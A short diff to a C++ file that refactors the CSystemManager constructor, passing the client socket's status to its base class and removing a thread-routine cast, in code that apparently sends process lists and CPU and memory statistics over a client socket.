@@ -20,10 +20,10 @@
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient)
+CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient, pClient->GetStatus())
 {
     SendProcessList();
-    hSendMemoryThread= MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendCPUAndMemoryThread, (LPVOID)this, 0, NULL);
+    hSendMemoryThread= MyCreateThread(NULL, 0, SendCPUAndMemoryThread, (LPVOID)this, 0, NULL);
 }
 
 CSystemManager::~CSystemManager()
